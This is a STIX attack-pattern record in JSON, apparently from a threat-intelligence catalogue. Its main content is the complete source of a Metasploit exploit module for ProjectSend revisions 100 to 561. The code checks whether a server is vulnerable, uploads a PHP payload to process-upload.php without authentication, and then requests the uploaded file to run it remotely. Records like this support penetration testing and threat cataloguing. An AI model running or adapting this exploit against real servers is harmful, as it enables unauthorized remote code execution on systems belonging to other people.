{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66fad2db-87ea-44be-aaa7-931a68ae3a07",
    "created": "2024-08-14T17:14:06.511089Z",
    "modified": "2024-08-14T17:14:06.511093Z",
    "name": "ProjectSend Arbitrary File Upload",
    "description": " This module exploits a file upload vulnerability in ProjectSend revisions 100 to 561. The 'process-upload.php' file allows unauthenticated users to upload PHP files resulting in remote code execution as the web server user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/projectsend_upload_exec.rb",
            "external_id": "projectsend_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'ProjectSend Arbitrary File Upload',\n      'Description'    => %q{\n        This module exploits a file upload vulnerability in ProjectSend\n        revisions 100 to 561. The 'process-upload.php' file allows\n        unauthenticated users to upload PHP files resulting in remote\n        code execution as the web server user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Fady Mohammed Osman', # Discovery and Exploit\n          'bcoles' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['EDB', '35424']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\"\n        },\n      'Arch'           => ARCH_PHP,\n      'Platform'       => 'php',\n      'Targets'        =>\n        [\n          # Tested on ProjectSend revisions 100, 157, 180, 250, 335, 405 and 561 on Apache (Ubuntu)\n          ['ProjectSend (PHP Payload)', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-12-02',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to ProjectSend', '/ProjectSend/'])\n        ])\n  end\n\n  #\n  # Checks if target upload functionality is working\n  #\n  def check\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'process-upload.php')\n    )\n    if !res\n      vprint_error(\"Connection timed out\")\n      return Exploit::CheckCode::Unknown\n    elsif res.code.to_i == 404\n      vprint_error(\"No process-upload.php found\")\n      return Exploit::CheckCode::Safe\n    elsif res.code.to_i == 500\n      vprint_error(\"Unable to write file\")\n      return Exploit::CheckCode::Safe\n    elsif res.code.to_i == 200 && res.body && res.body =~ /<\\?php/\n      vprint_error(\"File process-upload.php is not executable\")\n      return Exploit::CheckCode::Safe\n    elsif res.code.to_i == 200 && res.body && res.body =~ /sys\\.config\\.php/\n      vprint_error(\"Software is misconfigured\")\n      return Exploit::CheckCode::Safe\n    elsif res.code.to_i == 200 && res.body && res.body =~ /jsonrpc/\n      # response on revision 118 onwards includes the file name\n      if res.body && res.body =~ /NewFileName/\n        return Exploit::CheckCode::Vulnerable\n      # response on revisions 100 to 117 does not include the file name\n      elsif res.body && res.body =~ /{\"jsonrpc\" : \"2.0\", \"result\" : null, \"id\" : \"id\"}/\n        return Exploit::CheckCode::Appears\n      elsif res.body && res.body =~ /Failed to open output stream/\n        vprint_error(\"Upload folder is not writable\")\n        return Exploit::CheckCode::Safe\n      else\n        return Exploit::CheckCode::Detected\n      end\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  #\n  # Upload PHP payload\n  #\n  def upload\n    fname = \"#{rand_text_alphanumeric(rand(10) + 6)}.php\"\n    php = \"<?php #{payload.encoded} ?>\"\n    data = Rex::MIME::Message.new\n    data.add_part(php, 'application/octet-stream', nil, %(form-data; name=\"file\"; filename=\"#{fname}\"))\n    post_data = data.to_s\n    print_status(\"Uploading file '#{fname}' (#{php.length} bytes)\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, \"process-upload.php?name=#{fname}\"),\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => post_data\n    )\n    if !res\n      fail_with(Failure::Unknown, \"#{peer} - Request timed out while uploading\")\n    elsif res.code.to_i == 404\n      fail_with(Failure::NotFound, \"#{peer} - No process-upload.php found\")\n    elsif res.code.to_i == 500\n      fail_with(Failure::Unknown, \"#{peer} - Unable to write #{fname}\")\n    elsif res.code.to_i == 200 && res.body && res.body =~ /Failed to open output stream/\n      fail_with(Failure::NotVulnerable, \"#{peer} - Upload folder is not writable\")\n    elsif res.code.to_i == 200 && res.body && res.body =~ /<\\?php/\n      fail_with(Failure::NotVulnerable, \"#{peer} - File process-upload.php is not executable\")\n    elsif res.code.to_i == 200 && res.body && res.body =~ /sys.config.php/\n      fail_with(Failure::NotVulnerable, \"#{peer} - Software is misconfigured\")\n    # response on revision 118 onwards includes the file name\n    elsif res.code.to_i == 200 && res.body && res.body =~ /NewFileName/\n      print_good(\"Payload uploaded successfully (#{fname})\")\n      return fname\n    # response on revisions 100 to 117 does not include the file name\n    elsif res.code.to_i == 200 && res.body =~ /{\"jsonrpc\" : \"2.0\", \"result\" : null, \"id\" : \"id\"}/\n      print_warning(\"File upload may have failed\")\n      return fname\n    else\n      vprint_status(\"Received response: #{res.code} - #{res.body}\")\n      fail_with(Failure::Unknown, \"#{peer} - Something went wrong\")\n    end\n  end\n\n  #\n  # Execute uploaded file\n  #\n  def exec(upload_path)\n    print_status(\"Executing #{upload_path}...\")\n    res = send_request_raw(\n      { 'uri' => normalize_uri(target_uri.path, upload_path) }, 5\n    )\n    if !res\n      print_status(\"Request timed out while executing\")\n    elsif res.code.to_i == 404\n      vprint_error(\"Not found: #{upload_path}\")\n    elsif res.code.to_i == 200\n      vprint_good(\"Executed #{upload_path}\")\n    else\n      print_error(\"Unexpected reply\")\n    end\n  end\n\n  #\n  # upload && execute\n  #\n  def exploit\n    fname = upload\n    register_files_for_cleanup(fname)\n    exec(\"upload/files/#{fname}\") # default for r-221 onwards\n    unless session_created?\n      exec(\"upload/temp/#{fname}\")  # default for r-100 to r-219\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-02",
    "x_mitre_platforms": [
        "php'"
    ]
}